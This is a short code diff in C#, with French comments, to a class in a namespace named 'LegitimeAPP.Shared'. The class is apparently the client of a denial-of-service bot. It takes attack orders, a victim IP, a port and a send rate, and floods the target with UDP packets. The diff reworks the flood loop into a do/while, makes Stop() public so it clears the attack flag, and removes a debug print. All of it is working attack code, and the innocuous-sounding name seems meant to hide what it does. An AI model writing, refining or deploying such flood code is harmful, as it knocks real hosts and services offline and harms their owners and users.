@@ -106,9 +106,6 @@ namespace LegitimeAPP.Shared
 
                 OnNewAttackOrder();
 
-
-                Console.WriteLine("CE QUE JE VEUX : " + (_attackInProgress ? "EST TRUE" : "EST FALSE") )  ;
-
             Timer = new System.Timers.Timer(nbSecond * 1000)
             {
                 AutoReset = false,
@@ -142,9 +139,9 @@ namespace LegitimeAPP.Shared
 
 
         // ARRÊTE L'ATTAQUE EN COURS 
-        private void Stop()
+        public void Stop()
         {
-
+            _attackInProgress = false ; 
         }
 
         // PERMET DE CHANGER DE CIBLE 
@@ -182,21 +179,15 @@ namespace LegitimeAPP.Shared
             Socket target = new(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
             IPEndPoint ep = new(IPAddress.Parse(this.VictimIP), this.Port);
 
-
-            while (true)
-            {
-
+            do {
                 Console.WriteLine("On attaque ! ") ; 
 
                 target.SendTo(data, ep);
 
                 // attente avant chaque envoie 
                 Thread.Sleep(this.speed);
-
-                if ( !_attackInProgress ) {
-                    break ; 
-                }
-            }
+            }while(_attackInProgress) ;
+       
 
          }
     }
